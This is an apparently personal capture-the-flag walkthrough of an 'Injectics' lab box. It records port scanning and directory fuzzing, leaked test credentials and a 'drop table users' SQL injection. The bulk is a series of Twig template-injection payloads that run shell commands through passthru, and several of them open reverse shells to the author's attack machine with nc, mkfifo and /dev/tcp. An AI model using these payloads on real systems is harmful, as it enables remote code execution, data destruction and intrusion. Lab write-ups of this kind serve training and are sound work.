</br> basic scan...
</br>nmap 80 22 -A 10.10.65.186 -v
</br>
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Injectics Leaderboard
MAC Address: 02:58:9A:7A:B5:E1 (Unknown)
```

</br>enumerate dirs in the http port 80 webserver
</br>
</br>`gobuster dir -u http://10.10.166.252:3333 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-words.txt`
</br>
(cap for admin panel)
(cap) for subdir to flags
</br>/flags has more stuff inside of it, but we can't access the folder itsef
</br>
</br>wfuzz -c -f sub-fighter -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-words.txt --hw 31 http://10.10.65.186/flags/FUZZ
</br>

</br>leaked lead in html about mail.log file
</br>
</br>truncated credentials leaked:
```
| Email                     | Password 	              |
|---------------------------|-------------------------|
| superadmin@injectics.thm  | superSecurePasswd101    |
| dev@injectics.thm         | devPasswd123            |
```

</br>mess around with the js file to copy it over then remove the filter to bork it
</br>
</br>1;drop table users;

</br>admin access passthru (exec disallowed)
</br>{{['id',""]|sort('passthru')}}

</br>{{['rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.7.201 1984 >/tmp/f',""]|sort('passthru')}}
</br>10.10.7.201 is my atk box
</br>
</br>running gobuster against /vendor shows there is /bin and /twig
</br>twig is an ssti --> kind of injection vuln if we use a certain syntax
</br>(Server side template injection)
</br>ssti BS syntax, just memorize it
</br>`{{['bash -c "bash -i >& /dev/tcp/10.10.65.186/1984 0>&1"','']|sort('passthru)}}`
</br>
</br>{{['bash -c "bash -i >&/dev/tcp/10.10.2.130/1984 0>&1"','']|sort('passthru')}}
</br>`{{["bash -c 'exec bash -i >&/dev/tcp/10.10.2.130/1984 0>&1' ",""] | sort('passthru') }}`
</br>`{{['busybox nc 10.10.2.130 1984 -e /bin/bash','']|sort('passthru')}}`
</br> literally 3 hours of payload testing later...
</br> `{{ ["bash -c 'exec bash -i >& /dev/tcp/10.10.2.130/1984 0>&1'", ""] | sort('passthru') }}`
</br>goal is to enumerate so screwing around by using injections like
</br> {{['ls- la /directory/name',""]|sort('passthru')}}
</br> helped enumeration
</br> We only want to read from a thing, so though I couldn't get a shell because the environment is Borked, I could still complete the objective and read the target file
</br>
</br> {{['cat /var/www/html/flags/5d8af1dc14503c7e4bdc8e51a3469f48.txt',""]|sort('passthru')}}
